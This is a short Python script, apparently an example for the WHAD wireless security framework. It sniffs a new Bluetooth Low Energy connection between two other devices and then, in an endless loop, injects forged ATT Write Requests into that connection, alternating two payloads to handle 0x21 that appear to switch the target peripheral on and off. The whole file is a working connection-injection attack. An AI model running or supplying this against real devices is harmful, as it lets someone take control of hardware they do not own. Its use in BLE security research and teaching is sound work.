from whad.ble import Sniffer, Injector
from whad.device import WhadDevice
from whad.exceptions import WhadDeviceNotFound
from whad.ble.exceptions import ConnectionLostException, NotSynchronized
from time import time,sleep
from scapy.all import BTLE_DATA, L2CAP_Hdr, ATT_Hdr, ATT_Write_Request
from whad.cli.ui import error, info, success, display_packet
import sys

def show(pkt):
    display_packet(pkt)

if __name__ == '__main__':
    if len(sys.argv) >= 2:
        # Retrieve target interface
        interface = sys.argv[1]

        # Connect to target device and performs discovery
        try:
            dev = WhadDevice.create(interface)

            # Configure the interface as a sniffer
            sniffer = Sniffer(dev)

            # Attach a callback to display packets in real time
            sniffer.attach_callback(show)
            try:
                # Wait for a new connection
                connection = sniffer.wait_new_connection()

                # Configure the injector connector with the parameters of the sniffed connection
                injector = Injector(dev, connection=connection)
                # Attach a callback to display packets in real time
                injector.attach_callback(show)

                # Every second, build & inject a Write Request in the connection (inject to the slave node)
                while True:
                    ok, attempts = injector.inject_to_slave(
                        BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Write_Request(gatt_handle=0x21, data=b"\x55\x10\x00\x0d\x0a")
                    )
                    if ok:
                        success("Injection successful in " + str(attempts) + " attempts")
                    else:
                        info("Injection failure")

                    sleep(1)

                    ok, attempts = injector.inject_to_slave(
                        BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Write_Request(gatt_handle=0x21, data=b"\x55\x10\x01\x0d\x0a")
                    )
                    if ok:
                        success("Injection successful in " + str(attempts) + " attempts")
                    else:
                        info("Injection failure")

                    sleep(1)

            except ConnectionLostException as e:
                error("Connection lost")

            except NotSynchronized as e:
                error("No synchronization")

        except (KeyboardInterrupt, SystemExit):
            dev.close()

        except WhadDeviceNotFound:
            error('Device not found')
            exit(1)
    else:
        print('Usage: %s [device]' % sys.argv[0])
